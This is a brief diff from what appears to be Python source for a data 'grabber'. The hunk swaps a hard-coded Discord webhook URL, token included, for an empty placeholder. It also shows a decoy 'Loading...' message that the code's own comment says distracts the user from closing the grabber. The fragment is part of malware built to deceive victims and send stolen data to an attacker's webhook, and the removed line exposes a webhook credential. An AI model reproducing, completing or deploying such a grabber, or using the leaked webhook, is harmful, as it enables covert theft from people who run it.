@@ -25,7 +25,7 @@ except:
     print("Failed to import libraies. Please contact Mani.#0001 at discord to fix this problem.")
     exit()
 
-webhookk = "https://discord.com/api/webhooks/980413044054171708/IEG9O5HHpLu2Z_srsPCCOA0EEaH4B7lkVAvj0fpAKC3pwpyzXFOplsW4i2k_co4QkpHo" # put webhook here
+webhookk = "" # put webhook here
 
 
 dummy_message = "Loading..." # A message that distracts the user from closing the grabber
